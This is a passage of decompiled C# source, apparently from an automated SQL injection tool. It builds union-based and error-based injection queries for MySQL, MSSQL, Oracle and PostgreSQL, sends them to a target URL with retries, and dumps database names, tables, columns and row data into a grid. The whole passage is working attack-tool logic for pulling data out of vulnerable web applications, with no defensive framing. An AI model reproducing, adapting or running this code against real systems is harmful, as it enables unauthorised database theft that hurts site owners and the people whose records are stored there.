						if (Operators.ConditionalCompareObjectEqual(left2, 0, TextCompare: false))
						{
							oTopN = OracleTopN.ROWNUM;
						}
						else if (Operators.ConditionalCompareObjectEqual(left2, 1, TextCompare: false))
						{
							oTopN = OracleTopN.RANK;
						}
						else if (Operators.ConditionalCompareObjectEqual(left2, 2, TextCompare: false))
						{
							oTopN = OracleTopN.DENSE_RANK;
						}
						if (!method_10() || types_0 != Types.Oracle_No_Error)
						{
							text = ((enum5_0 == Enum5.const_5) ? Oracle.Dump(text, oMethod2, bError, "", "", list_2, bCastAsChar, oTopN, int_3, string_11, string_12, "", class45_0.method_0(0).Query) : Oracle.Dump(text, oMethod2, bError, string_9, string_10, list_2, bCastAsChar, oTopN, int_3, string_11, string_12));
							break;
						}
						text = string_5;
						checked
						{
							int num3 = int_1 - 1;
							for (int k = 0; k <= num3; k++)
							{
								string sTraject3 = "[t]";
								sTraject3 = ((enum5_0 == Enum5.const_5) ? Oracle.Dump(sTraject3, oMethod2, bError, "", "", list_2, bCastAsChar, oTopN, int_1 * int_3 + k, string_11, string_12, "", class45_0.method_0(0).Query) : Oracle.Dump(sTraject3, oMethod2, bError, string_9, string_10, list_2, bCastAsChar, oTopN, int_1 * int_3 + k, string_11, string_12));
								text = ((k != 0) ? text.Replace("[t" + Conversions.ToString(k), sTraject3) : text.Replace("[t]", sTraject3));
							}
							break;
						}
					}
					}
					break;
				}
			}
			case Types.PostgreSQL_No_Error:
			case Types.PostgreSQL_With_Error:
			{
				PostgreSQLErrorType bError2 = default(PostgreSQLErrorType);
				InjectionType oMethod = default(InjectionType);
				switch (types_0)
				{
				case Types.PostgreSQL_With_Error:
					bError2 = PostgreSQLErrorType.CAST_INT;
					oMethod = InjectionType.Error;
					break;
				case Types.PostgreSQL_No_Error:
					bError2 = PostgreSQLErrorType.NONE;
					break;
				}
				switch (schema_0)
				{
				case Schema.INFO:
					text = PostgreSQL.Info(text, oMethod, bError2, list_2);
					break;
				case Schema.DATABASES:
					text = PostgreSQL.DataBases(text, oMethod, bError2, bCorrentDB: false, int_3, string_11, string_12);
					break;
				case Schema.TABLES:
					text = PostgreSQL.Tables(text, oMethod, string_9, bError2, int_3, string_11, string_12);
					break;
				case Schema.COLUMNS:
					text = PostgreSQL.Columns(text, oMethod, string_9, string_10, bError2, int_3, string_11, string_12);
					break;
				case Schema.ROWS:
				{
					if (!method_10() || types_0 != Types.PostgreSQL_No_Error)
					{
						text = ((enum5_0 == Enum5.const_5) ? PostgreSQL.Dump(text, oMethod, "", "", list_2, bError2, int_3, string_11, string_12, "", "(" + class45_0.method_0(0).Query + ")") : PostgreSQL.Dump(text, oMethod, string_9, string_10, list_2, bError2, int_3, string_11, string_12));
						break;
					}
					text = string_5;
					int num = int_1 - 1;
					for (int i = 0; i <= num; i++)
					{
						string sTraject = "[t]";
						sTraject = ((enum5_0 == Enum5.const_5) ? PostgreSQL.Dump(sTraject, oMethod, "", "", list_2, bError2, int_1 * int_3 + i, string_11, string_12, "", "(" + class45_0.method_0(0).Query + ")") : PostgreSQL.Dump(sTraject, oMethod, string_9, string_10, list_2, bError2, int_1 * int_3 + i, string_11, string_12));
						text = ((i != 0) ? text.Replace("[t" + Conversions.ToString(i), sTraject) : text.Replace("[t]", sTraject));
					}
					break;
				}
				}
				break;
			}
			}
			return text;
		}
	}

	private int method_19(Schema schema_0, string string_9, string string_10, ref string string_11)
	{
		int result = -1;
		string string_12 = "";
		string sTraject = "[t]";
		if ((enum5_0 != Enum5.const_0) & (enum5_0 != Enum5.const_5))
		{
			string_12 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(method_7(chkDumpWhere)), RuntimeHelpers.GetObjectValue(method_7(txtSchemaWhere)), ""));
			method_15(ref string_12);
		}
		try
		{
			if (types_0 == Types.MySQL_No_Error)
			{
				if (enum5_0 != Enum5.const_5)
				{
					sTraject = MySQLNoError.Count(sTraject, method_14(), schema_0, string_9, string_10, string_12);
				}
				else
				{
					List<string> list = new List<string>();
					list.Add("count(0)");
					string query = class45_0.method_0(0).Query;
					sTraject = MySQLNoError.Dump(sTraject, method_14(), bHexEncoded: false, bIFNULL: false, "", "", list, 0, 1, "", "", "", query);
				}
			}
			else if (types_0 == Types.MySQL_With_Error)
			{
				object left = method_7(cmbOracleErrType);
				MySQLErrorType oType = default(MySQLErrorType);
				if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
				{
					oType = MySQLErrorType.DuplicateEntry;
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
				{
					oType = MySQLErrorType.ExtractValue;
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
				{
					oType = MySQLErrorType.UpdateXML;
				}
				if (enum5_0 != Enum5.const_5)
				{
					sTraject = MySQLWithError.Count(sTraject, method_14(), oType, schema_0, string_9, string_10, string_12);
				}
				else
				{
					List<string> list2 = new List<string>();
					list2.Add("count(0)");
					string query2 = class45_0.method_0(0).Query;
					sTraject = MySQLWithError.Dump(sTraject, method_14(), oType, bIFNULL: false, "", "", list2, 0, 1, "", "", "", query2);
				}
			}
			else if ((types_0 == Types.MSSQL_No_Error) | (types_0 == Types.MSSQL_With_Error))
			{
				InjectionType oError = default(InjectionType);
				switch (types_0)
				{
				case Types.MSSQL_With_Error:
					oError = InjectionType.Error;
					break;
				case Types.MSSQL_No_Error:
					oError = InjectionType.Union;
					break;
				}
				bool bCollateLatin = Conversions.ToBoolean(method_7(chkMSSQL_Latin1));
				bool flag = Conversions.ToBoolean(method_7(chkMSSQLCastAsChar));
				if (enum5_0 == Enum5.const_5)
				{
					return 32767;
				}
				sTraject = MSSQL.Count(sTraject, oError, Conversions.ToString(flag), bCollateLatin, schema_0, string_9, string_10, string_12);
			}
			else if ((types_0 == Types.Oracle_No_Error) | (types_0 == Types.Oracle_With_Error))
			{
				bool bCastAsChar = Conversions.ToBoolean(method_7(chkOracleCastAsChar));
				InjectionType oMethod = default(InjectionType);
				switch (types_0)
				{
				case Types.Oracle_With_Error:
					oMethod = InjectionType.Error;
					break;
				case Types.Oracle_No_Error:
					oMethod = InjectionType.Union;
					break;
				}
				bool flag2;
				OracleErrorType bError = default(OracleErrorType);
				if ((flag2 = true) == (types_0 == Types.Oracle_No_Error))
				{
					bError = OracleErrorType.NONE;
				}
				else if (Operators.ConditionalCompareObjectEqual(flag2, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 0, TextCompare: false), TextCompare: false))
				{
					bError = OracleErrorType.GET_HOST_ADDRESS;
				}
				else if (Operators.ConditionalCompareObjectEqual(flag2, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 1, TextCompare: false), TextCompare: false))
				{
					bError = OracleErrorType.DRITHSX_SN;
				}
				else if (Operators.ConditionalCompareObjectEqual(flag2, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 2, TextCompare: false), TextCompare: false))
				{
					bError = OracleErrorType.GETMAPPINGXPATH;
				}
				if (enum5_0 == Enum5.const_5)
				{
					return 32767;
				}
				sTraject = Oracle.Count(sTraject, oMethod, bError, bCastAsChar, schema_0, string_9, string_10, string_12);
			}
			else
			{
				if (!((types_0 == Types.PostgreSQL_No_Error) | (types_0 == Types.PostgreSQL_With_Error)))
				{
					Interaction.MsgBox("FIX ME ");
					return -1;
				}
				PostgreSQLErrorType bError2 = default(PostgreSQLErrorType);
				InjectionType oMethod2 = default(InjectionType);
				switch (types_0)
				{
				case Types.PostgreSQL_With_Error:
					bError2 = PostgreSQLErrorType.CAST_INT;
					oMethod2 = InjectionType.Error;
					break;
				case Types.PostgreSQL_No_Error:
					bError2 = PostgreSQLErrorType.NONE;
					oMethod2 = InjectionType.Union;
					break;
				}
				if (enum5_0 == Enum5.const_5)
				{
					return 32767;
				}
				sTraject = PostgreSQL.Count(sTraject, oMethod2, bError2, schema_0, string_9, string_10, string_12);
			}
			int num = Conversions.ToInteger(method_7(numMaxRetry));
			Conversions.ToInteger(method_7(numSleep));
			int num2 = default(int);
			while (true)
			{
				string text = "";
				if (WorkedRequestStop())
				{
					break;
				}
				HTTPExt httpext_ = null;
				text = method_26(ref sTraject, ref string_11, ref httpext_);
				if (string.IsNullOrEmpty(text))
				{
					if (num2 < num)
					{
						num2 = checked(num2 + 1);
						continue;
					}
					string_11 = Globals.translate_0.GetStr(this, 30);
					break;
				}
				List<string> list3 = method_17(text);
				if (list3.Count <= 0)
				{
					break;
				}
				foreach (string item in list3)
				{
					int num3 = Conversions.ToInteger(item);
					if (Versioned.IsNumeric(num3))
					{
						result = num3;
						break;
					}
				}
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string_11 = "Error: " + ex2.StackTrace;
			ProjectData.ClearProjectError();
		}
		finally
		{
		}
		return result;
	}

	private List<string> method_20(Schema schema_0, string string_9, string string_10, List<string> list_2, int int_3, int int_4, string string_11, string string_12, ref string string_13, Class47 class47_0 = null, int int_5 = -1, [Optional][DefaultParameterValue(null)] ref HTTPExt httpext_0)
	{
		List<string> list = new List<string>();
		try
		{
			bool flag = Conversions.ToBoolean(method_7(chkDumpEncodedHex));
			int num = Conversions.ToInteger(method_7(numMaxRetry));
			Conversions.ToInteger(method_7(numSleep));
			Types types = types_0;
			if (types == Types.MySQL_No_Error || types == Types.MySQL_With_Error)
			{
				if (schema_0 == Schema.INFO || schema_0 == Schema.ROWS)
				{
					flag = Conversions.ToBoolean(method_7(chkDumpEncodedHex));
				}
			}
			string string_14 = method_18(schema_0, string_9, string_10, list_2, int_3, int_4, string_11, string_12, ref string_13, class47_0, int_5);
			int num2 = default(int);
			while (true)
			{
				if (!WorkedRequestStop())
				{
					if (!WorkedRequestRetryExceeded(0))
					{
						string text = "";
						text = method_26(ref string_14, ref string_13, ref httpext_0);
						if (string.IsNullOrEmpty(text))
						{
							if (string.IsNullOrEmpty(string_13))
							{
								string_13 = Globals.translate_0.GetStr(this, 30) + ", Index: " + Conversions.ToString(int_3);
							}
							if (!Conversions.ToBoolean(enum5_0 == Enum5.const_4 && Conversions.ToBoolean(method_7(chkDumpFieldByField))) && num2 < num)
							{
								num2 = checked(num2 + 1);
								continue;
							}
							break;
						}
						List<string> list2 = method_17(text);
						if (list2.Count != 0)
						{
							foreach (string item in list2)
							{
								string text2 = item;
								if (flag & !Versioned.IsNumeric(text2))
								{
									text2 = Class23.smethod_19(text2);
								}
								list.Add(text2);
							}
							string_13 = Globals.translate_0.GetStr(this, 31) + Globals.FormatNumbers(list2.Count);
						}
						else
						{
							string_13 = Globals.translate_0.GetStr(this, 32) + Conversions.ToString(int_3);
						}
						break;
					}
					string_13 = string_2;
					break;
				}
				string_13 = string_3;
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string_13 = "Row Index: " + Conversions.ToString(int_3) + " Error: " + ex2.ToString();
			ProjectData.ClearProjectError();
		}
		finally
		{
		}
		return list;
	}

	private void method_21(Class47 class47_0)
	{
		string string_ = "Empty";
		checked
		{
			bool flag2 = default(bool);
			try
			{
				Conversions.ToInteger(method_7(numSleep));
				string string_2 = "";
				string string_3 = "";
				if ((enum5_0 != Enum5.const_0) & (enum5_0 != Enum5.const_5))
				{
					string_2 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(method_7(chkDumpWhere)), RuntimeHelpers.GetObjectValue(method_7(txtSchemaWhere)), ""));
					string_3 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(method_7(chkDumpOrderBy)), RuntimeHelpers.GetObjectValue(method_7(txtSchemaOrderBy)), ""));
					method_15(ref string_2);
					method_15(ref string_3);
				}
				string string_4 = "";
				int num = Conversions.ToInteger(method_7(numMaxRetry));
				bool flag = Conversions.ToBoolean(method_7(chkDumpEncodedHex));
				switch (enum5_0)
				{
				case Enum5.const_1:
					string_4 = method_18(Schema.DATABASES, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, string_2, string_3, ref string_, class47_0);
					break;
				case Enum5.const_2:
					string_4 = method_18(Schema.TABLES, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, string_2, string_3, ref string_, class47_0);
					break;
				case Enum5.const_3:
					string_4 = method_18(Schema.COLUMNS, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, string_2, string_3, ref string_, class47_0);
					break;
				}
				int num2 = default(int);
				int num4 = default(int);
				while (true)
				{
					string text = "";
					if (WorkedRequestStop())
					{
						break;
					}
					HTTPExt httpext_ = null;
					text = method_26(ref string_4, ref string_, ref httpext_);
					if (string.IsNullOrEmpty(text))
					{
						if (num2 < num)
						{
							num2++;
							continue;
						}
						if (string.IsNullOrEmpty(string_))
						{
							string_ = Globals.translate_0.GetStr(this, 30) + ", Index: " + Conversions.ToString(class47_0.Int32_0);
						}
						break;
					}
					List<string> list = method_17(text);
					if (list.Count != 0)
					{
						foreach (string item in list)
						{
							if (!flag2)
							{
								flag2 = !string.IsNullOrEmpty(item);
							}
						}
						foreach (string item2 in list)
						{
							string expression = item2;
							if (flag & !Versioned.IsNumeric(expression))
							{
								expression = Class23.smethod_19(expression);
							}
							string[] array = Strings.Split(expression, ",");
							int num3 = array.Length - 1;
							int i;
							for (i = 0; i <= num3; i++)
							{
								if ((enum5_0 == Enum5.const_3) & (types_0 == Types.MySQL_No_Error))
								{
									string[] array2 = array[i].Split(':');
									if (!method_53(array2[0]))
									{
										break;
									}
									_ = 0;
									if (array2[0].Contains(">") | array2[0].Contains("<") | array2[0].Contains("/") | array2[0].Contains(")") | array2[0].Contains("(") | array2[0].Contains("\""))
									{
										break;
									}
								}
								else if (!method_53(array[i]))
								{
									break;
								}
							}
							if (i < array.Length - 1)
							{
								array = (string[])Utils.CopyArray(array, new string[i - 1 + 1]);
							}
							switch (enum5_0)
							{
							case Enum5.const_1:
							{
								string[] array4 = array;
								foreach (string string_6 in array4)
								{
									method_47(string_6);
									num4++;
									class44_0.RowsAdded++;
								}
								break;
							}
							case Enum5.const_2:
							{
								string[] array5 = array;
								foreach (string string_7 in array5)
								{
									method_48(class47_0.DataBase, string_7);
									num4++;
									class44_0.RowsAdded++;
								}
								break;
							}
							case Enum5.const_3:
							{
								if (types_0 == Types.MySQL_With_Error)
								{
									method_49(class47_0.DataBase, class47_0.Table, array[0]);
									class44_0.RowsAdded++;
									break;
								}
								string[] array3 = array;
								foreach (string string_5 in array3)
								{
									method_49(class47_0.DataBase, class47_0.Table, string_5);
									num4++;
									class44_0.RowsAdded++;
								}
								break;
							}
							}
						}
					}
					else
					{
						string_ = Globals.translate_0.GetStr(this, 32) + Conversions.ToString(class47_0.Int32_0);
					}
					break;
				}
				if (!Conversions.ToBoolean(Operators.AndObject(method_7(chkAllInOneRequest), types_0 == Types.MySQL_No_Error)))
				{
					return;
				}
				switch (enum5_0)
				{
				case Enum5.const_1:
				case Enum5.const_2:
				case Enum5.const_3:
					if (num4 < class47_0.AfectedRows)
					{
						dumpLoading_0.method_1(ProgressBarStyle.Blocks);
						List<string> list2 = new List<string>();
						int num5 = num4;
						int num6 = class47_0.AfectedRows - 1;
						int num9 = default(int);
						for (int m = num5; m <= num6; m++)
						{
							int percentProgress = (int)Math.Round(Math.Round((double)(100 * (m + 1)) / (double)class47_0.AfectedRows));
							bckWorker.ReportProgress(percentProgress, "");
							switch (enum5_0)
							{
							case Enum5.const_1:
							{
								string dataBase3 = class47_0.DataBase;
								string table3 = class47_0.Table;
								int int_3 = m;
								string string_12 = string_2;
								string string_13 = string_3;
								HTTPExt httpext_ = null;
								list2 = method_20(Schema.DATABASES, dataBase3, table3, null, int_3, 1, string_12, string_13, ref string_, null, -1, ref httpext_);
								break;
							}
							case Enum5.const_2:
							{
								string dataBase2 = class47_0.DataBase;
								string table2 = class47_0.Table;
								int int_2 = m;
								string string_10 = string_2;
								string string_11 = string_3;
								HTTPExt httpext_ = null;
								list2 = method_20(Schema.TABLES, dataBase2, table2, null, int_2, 1, string_10, string_11, ref string_, null, -1, ref httpext_);
								break;
							}
							case Enum5.const_3:
							{
								string dataBase = class47_0.DataBase;
								string table = class47_0.Table;
								int int_ = m;
								string string_8 = string_2;
								string string_9 = string_3;
								HTTPExt httpext_ = null;
								list2 = method_20(Schema.COLUMNS, dataBase, table, null, int_, 1, string_8, string_9, ref string_, null, -1, ref httpext_);
								break;
							}
							}
							if (list2.Count == 0)
							{
								lock (class44_0)
								{
									int num7 = num4;
									int num8 = class47_0.AfectedRows - 1;
									for (int n = num7; n <= num8; n++)
									{
										class44_0.list_1.Add(n);
									}
								}
								break;
							}
							foreach (string item3 in list2)
							{
								switch (enum5_0)
								{
								case Enum5.const_1:
									method_47(item3);
									UpDateStatus("[" + Strings.FormatNumber(m + 1, 0) + "/" + Strings.FormatNumber(class47_0.AfectedRows, 0) + "] " + this.string_4 + " dumping missing databases..");
									break;
								case Enum5.const_2:
									method_48(class47_0.DataBase, item3);
									UpDateStatus("[" + Strings.FormatNumber(m + 1, 0) + "/" + Strings.FormatNumber(class47_0.AfectedRows, 0) + "] " + this.string_4 + " dumping missing tables..");
									break;
								case Enum5.const_3:
									method_49(class47_0.DataBase, class47_0.Table, item3);
									UpDateStatus("[" + Strings.FormatNumber(m + 1, 0) + "/" + Strings.FormatNumber(class47_0.AfectedRows, 0) + "] " + this.string_4 + " dumping missing columns..");
									break;
								}
								num9++;
								class44_0.RowsAdded++;
							}
							if (!WorkedRequestStop())
							{
								if (WorkedRequestRetryExceeded(0))
								{
									string_ = this.string_2;
									break;
								}
								continue;
							}
							string_ = this.string_3 + ", ";
							break;
						}
						num4 = class47_0.AfectedRows;
					}
					switch (enum5_0)
					{
					default:
						Interaction.MsgBox("FIX ME ");
						break;
					case Enum5.const_1:
						string_ = Globals.translate_0.GetStr(this, 33) + " (" + Conversions.ToString(num4) + ")";
						break;
					case Enum5.const_2:
						string_ = Globals.translate_0.GetStr(this, 34) + " (" + Conversions.ToString(num4) + ")";
						break;
					case Enum5.const_3:
						string_ = Globals.translate_0.GetStr(this, 35) + " (" + Conversions.ToString(num4) + ")";
						break;
					}
					break;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string_ = "Row Index: " + Conversions.ToString(class47_0.Int32_0) + " Error: " + ex2.ToString();
				flag2 = false;
				ProjectData.ClearProjectError();
			}
			finally
			{
				try
				{
					if (flag2)
					{
						if (!class44_0.dictionary_0.ContainsKey(class47_0.IndexJob))
						{
							class44_0.dictionary_0.Add(class47_0.IndexJob, string_);
						}
					}
					else
					{
						if (!class44_0.dictionary_1.ContainsKey(class47_0.IndexJob))
						{
							class44_0.dictionary_1.Add(class47_0.IndexJob, string_);
						}
						if (Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(Operators.NotObject(method_7(chkAllInOneRequest)), types_0 == Types.MySQL_No_Error), types_0 != Types.MySQL_No_Error)))
						{
							lock (class44_0)
							{
								if (!class44_0.list_1.Contains(class47_0.IndexJob))
								{
									class44_0.list_1.Add(class47_0.IndexJob);
								}
							}
						}
					}
					threadPool_0.Close(class47_0.Thread_0);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void method_22(Class47 class47_0)
	{
		string string_ = "Empty";
		string string_2 = "";
		string string_3 = "";
		checked
		{
			HTTPExt httpext_ = default(HTTPExt);
			bool flag2 = default(bool);
			bool flag3 = default(bool);
			try
			{
				httpext_ = appDomainControl_0.GetHTTP();
				Conversions.ToInteger(method_7(numSleep));
				bool flag = Conversions.ToBoolean(method_7(chkDumpFieldByField));
				Conversions.ToBoolean(method_7(chkDumpEncodedHex));
				string text = "";
				List<string> list = new List<string>();
				flag = Conversions.ToBoolean(method_7(chkDumpFieldByField));
				if ((enum5_0 != Enum5.const_0) & (enum5_0 != Enum5.const_5))
				{
					string_2 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(method_7(chkDumpWhere)), RuntimeHelpers.GetObjectValue(method_7(txtSchemaWhere)), ""));
					string_3 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(method_7(chkDumpOrderBy)), RuntimeHelpers.GetObjectValue(method_7(txtSchemaOrderBy)), ""));
					method_15(ref string_2);
					method_15(ref string_3);
				}
				if (((enum5_0 == Enum5.const_5) & Class54.smethod_9(types_0)) && (class45_0.method_0(0).Query.ToLower().Contains("into outfile") | class45_0.method_0(0).Query.ToLower().Contains("into dumpfile")))
				{
					flag2 = true;
					flag3 = method_16(ref string_);
				}
				int num = default(int);
				if (flag)
				{
					num = Conversions.ToInteger(method_7(numFieldByField));
					if (num > class47_0.Columns.Count)
					{
						num = class47_0.Columns.Count;
					}
				}
				if (flag2)
				{
					return;
				}
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(method_7(chkMySQLSplitRows), types_0 == Types.MySQL_With_Error), class47_0.Columns.Count == 1)))
				{
					int num2 = Conversions.ToInteger(method_7(numMaxRetry));
					int num3 = Conversions.ToInteger(method_7(numMySQLSplitRows));
					int num4 = Conversions.ToInteger(method_7(numMySQLSplitRowsLenght));
					List<string> list2 = new List<string>();
					int num5 = num3 - 1;
					int num6 = default(int);
					int num7 = default(int);
					for (int i = 0; i <= num5; i++)
					{
						if (WorkedRequestStop())
						{
							break;
						}
						if (WorkedRequestRetryExceeded(0))
						{
							break;
						}
						List<string> list3 = new List<string>();
						num6++;
						foreach (string column in class47_0.Columns)
						{
							if (i == 0)
							{
								list3.Add("substr(" + column + ",1," + Conversions.ToString(num4) + ")");
							}
							else
							{
								list3.Add("substr(" + column + "," + Conversions.ToString(num4 * i + 1) + "," + Conversions.ToString(num4) + ")");
							}
						}
						list2 = method_20(Schema.ROWS, class47_0.DataBase, class47_0.Table, list3, class47_0.Int32_0, class47_0.Int32_1, string_2, string_3, ref string_, class47_0, -1, ref httpext_);
						if (list2.Count == 0)
						{
							num7++;
							if (num7 > num2)
							{
								class44_0.list_0.Add("Dump failed, row index: " + Conversions.ToString(class47_0.Int32_0) + ", " + Conversions.ToString(class47_0.Int32_1));
								break;
							}
						}
						else if (list.Count == 0)
						{
							list.Add(list2[0]);
						}
						else
						{
							list[0] += list2[0];
						}
					}
					if (list.Count == 0)
					{
						class44_0.list_0.Add(Globals.translate_0.GetStr(this, 24) + Conversions.ToString(class47_0.Int32_0));
						lock (class44_0)
						{
							class44_0.int_0++;
							return;
						}
					}
					foreach (string item3 in list)
					{
						string[] array = Strings.Split(item3, Class54.string_2);
						if (!bool_5)
						{
							method_29(array.Length);
						}
						List<string> list4 = new List<string>();
						string[] array2 = array;
						foreach (string item in array2)
						{
							list4.Add(item);
						}
						dumpGrid_0.method_3(list4);
					}
					lock (class44_0)
					{
						class44_0.int_0 = 0;
					}
					flag3 = true;
					return;
				}
				if (flag & (class47_0.Columns.Count > 1))
				{
					bool flag4 = false;
					List<string> list5 = new List<string>();
					int num8 = class47_0.Columns.Count - 1;
					for (int k = 0; k <= num8; k++)
					{
						list5.Add(" ");
					}
					int num9 = Conversions.ToInteger(method_7(numMaxRetryColumn));
					int num10 = class47_0.Columns.Count - 1;
					int num11 = num;
					int num14 = default(int);
					for (int l = 0; ((num11 >> 31) ^ l) <= ((num11 >> 31) ^ num10); l += num11)
					{
						if (WorkedRequestStop())
						{
							break;
						}
						if (WorkedRequestRetryExceeded(0))
						{
							break;
						}
						if (l == 0)
						{
							lock (list_0)
							{
								if (list_0.Count > 0)
								{
									text = list_0[list_0.Count - 1];
									list_0.Remove(text);
								}
								else
								{
									text = "";
								}
							}
						}
						List<string> list6 = new List<string>();
						if (Class54.smethod_10(types_0))
						{
							list6.AddRange(class47_0.Columns);
						}
						else
						{
							int num12 = num - 1;
							for (int m = 0; m <= num12; m++)
							{
								int num13 = l + m;
								if (num13 < class47_0.Columns.Count)
								{
									list6.Add(class47_0.Columns[num13]);
								}
							}
						}
						list = method_20(Schema.ROWS, class47_0.DataBase, class47_0.Table, list6, class47_0.Int32_0, class47_0.Int32_1, string_2, string_3, ref string_, class47_0, l, ref httpext_);
						if (list.Count == 0 || string.IsNullOrEmpty(list[0].Trim()))
						{
							num14++;
							if (num14 > num9)
							{
								class44_0.list_0.Add("Dump failed, row index: " + Conversions.ToString(class47_0.Int32_0) + ", " + Conversions.ToString(class47_0.Int32_1) + ", column index: " + Conversions.ToString(l));
							}
							else
							{
								l--;
							}
						}
						else
						{
							flag4 = true;
							if (string.IsNullOrEmpty(text))
							{
								if (!bool_5)
								{
									method_29();
								}
								lock (dumpGrid_0)
								{
									text = dumpGrid_0.method_3(list5);
								}
							}
							lock (dumpGrid_0)
							{
								string[] array3 = Strings.Split(list[0], Class54.string_2);
								int num15 = num - 1;
								for (int n = 0; n <= num15; n++)
								{
									if (n < array3.Length)
									{
										dumpGrid_0.method_5(text, l + n, array3[n]);
									}
								}
							}
							lock (class44_0)
							{
								class44_0.int_0 = 0;
							}
							flag3 = true;
						}
						if (class47_0.TotalThreads == 1)
						{
							if (class47_0.AfectedRows == 32767)
							{
								UpDateStatus("[" + Strings.FormatNumber(class47_0.IndexJob + 1, 0) + "] " + string_4);
							}
							else if (num == 1)
							{
								UpDateStatus("[" + Strings.FormatNumber(class47_0.IndexJob + 1, 0) + "/" + Strings.FormatNumber(class47_0.AfectedRows, 0) + "] " + string_4 + " " + Globals.translate_0.GetStr(this, 36) + " " + Conversions.ToString(l + 1) + " / " + Conversions.ToString(class47_0.Columns.Count));
							}
							else
							{
								UpDateStatus("[" + Strings.FormatNumber(class47_0.IndexJob + 1, 0) + "/" + Strings.FormatNumber(class47_0.AfectedRows, 0) + "] " + string_4);
							}
						}
					}
					if (!flag4)
					{
						lock (class44_0)
						{
							class44_0.int_0++;
						}
						class44_0.list_0.Add(Globals.translate_0.GetStr(this, 24) + Conversions.ToString(class47_0.Int32_0));
					}
					else
					{
						if (!dumpGrid_0.method_4(text))
						{
							return;
						}
						lock (list_0)
						{
							if (!list_0.Contains(text))
							{
								list_0.Add(text);
							}
							return;
						}
					}
					return;
				}
				list = method_20(Schema.ROWS, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, string_2, string_3, ref string_, class47_0, -1, ref httpext_);
				if (list.Count == 0)
				{
					class44_0.list_0.Add(Globals.translate_0.GetStr(this, 24) + Conversions.ToString(class47_0.Int32_0));
					lock (class44_0)
					{
						class44_0.int_0++;
						return;
					}
				}
				foreach (string item4 in list)
				{
					string[] array4 = Strings.Split(item4, Class54.string_2);
					if (!bool_5)
					{
						method_29(array4.Length);
					}
					List<string> list7 = new List<string>();
					string[] array5 = array4;
					foreach (string item2 in array5)
					{
						list7.Add(item2);
					}
					dumpGrid_0.method_3(list7);
				}
				lock (class44_0)
				{
					class44_0.int_0 = 0;
				}
				flag3 = true;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string_ = "Error: " + ex2.ToString();
				flag3 = false;
				ProjectData.ClearProjectError();
			}
			finally
			{
				try
				{
					if (!flag2)
					{
						lock (class44_0)
						{
							if (flag3)
							{
								class44_0.RowsAdded++;
								if (!class44_0.dictionary_0.ContainsKey(class47_0.IndexJob))
								{
									class44_0.dictionary_0.Add(class47_0.IndexJob, string_);
								}
							}
							else
							{
								if (!class44_0.dictionary_1.ContainsKey(class47_0.IndexJob))
								{
									class44_0.dictionary_1.Add(class47_0.IndexJob, string_);
								}
								if (!class44_0.list_1.Contains(class47_0.IndexJob))
								{
									class44_0.list_1.Add(class47_0.IndexJob);
								}
							}
						}
					}
					appDomainControl_0.Dispose(httpext_);
					threadPool_0.Close(class47_0.Thread_0);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void method_23(Class47 class47_0)
	{
		string string_ = "";
		string text = "";
		try
		{
			int timeout = Conversions.ToInteger(method_7(numTimeOut));
			string text2 = Conversions.ToString(method_7(txtURL));
			Analyzer analyzer = new Analyzer(text2, 1);
			analyzer.DBType = types_0;
			analyzer.Timeout = timeout;
			analyzer.Delay = Conversions.ToInteger(method_7(numSleep));
			analyzer.Retry = Conversions.ToInteger(method_7(numMaxRetry));
			analyzer.FollowRedirects = Conversions.ToBoolean(method_7(chkHttpRedirect));
			UpDateStatus(Globals.translate_0.GetStr(this, 37));
			bool flag;
			if (flag = analyzer.CheckVersionNoCollactions(text2, checkRedirects: true))
			{
				string text3 = "";
				bool flag2;
				if ((flag2 = true) == Class54.smethod_9(types_0))
				{
					text3 = "database()";
				}
				else if (flag2 == Class54.smethod_10(types_0))
				{
					text3 = "db_name()";
				}
				else if (flag2 == Class54.smethod_11(types_0))
				{
					text3 = "(SELECT global_name FROM global_name)";
				}
				else if (flag2 == Class54.smethod_12(types_0))
				{
					text3 = "current_database()";
				}
				List<string> list = new List<string>();
				list.Add(text3);
				UpDateStatus(" " + Globals.translate_0.GetStr(this, 38) + " " + text3.ToUpper() + "..");
				list = analyzer.GetInfo(text2, text3);
				string_ = analyzer.Version;
				if (list.Count > 0)
				{
					text = list[0];
				}
			}
			appDomainControl_0.Dispose(analyzer.HTTPExt_0);
			if (flag)
			{
				bool flag3;
				if ((flag3 = true) == Class54.smethod_9(types_0))
				{
					method_8(cmbMySQLCollations, (int)analyzer.MySQLCollactions);
					method_8(cmbMySQLErrType, (int)analyzer.MySQLErrorType);
				}
				else if (flag3 == Class54.smethod_10(types_0))
				{
					method_8(chkMSSQL_Latin1, analyzer.MSSQLCollate);
					method_8(chkMSSQLCastAsChar, !string.IsNullOrEmpty(analyzer.MSSQLCast));
